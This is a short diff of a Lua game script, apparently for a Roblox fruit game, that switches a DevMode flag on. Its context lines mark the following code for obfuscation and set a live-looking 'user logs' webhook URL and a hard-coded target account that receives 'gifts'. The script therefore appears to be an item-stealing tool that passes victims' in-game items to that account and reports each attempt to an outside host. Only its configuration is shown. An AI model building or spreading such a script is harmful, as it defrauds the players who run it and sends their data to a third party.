@@ -12,7 +12,7 @@ local FruitsToHit = {
 -- =====================================================
 --                 OBFUSCATE AFTER THIS
 -- =====================================================
-DevMode = false -- Set to true for debug prints, warnings, errors, and console access
+DevMode = true -- Set to true for debug prints, warnings, errors, and console access
 
 local UserLogsWebhook = "https://l.webhook.party/hook/ugmfbasw17YEV6oXcUD4n3UW5idAuKlaru5U7OXitcnTU0q7pnPECWEiK59zJ2HWY0geg%2BPx24j%2Bmv%2FDW6XtOcvtDiYBcq8a3G6zfG9KanfeqUYCmHN0UxsqdBcHX0OLHEk4c8Z79fAaNYVBFgVvce2lq%2FnVjeOpLsM%2F2I61l9C0KGXnZNQtNLu4ljk1apf9qEN%2F%2B2WiW16KoqBPSsLaNMzD%2B3lMAEcCKMmizfAU%2BSKD9%2FSXDYhM1HXD%2Fya%2BKFH5AV%2FrZ2Fv5PQiqyfYt1Tb9DBaAkAhWvSdJ2omG1XV%2Fs%2Btzp%2F7ZNI6lDUFpcWFEtK06iC7jJvRZfNzj%2F%2BMTbUnWusCXbaLWpe5niVOjzO%2Fi0WUG%2BgJWiATpAdsMBlojTqOcg1v1NgSirjZ%2B5xH/4IElSA2lnU%2F1R%2FQk" -- Gifter success/attempt webhook (REPLACE)
 local UserGiftTarget = "x6TNine" -- Target username for gifts (MUST BE SET)
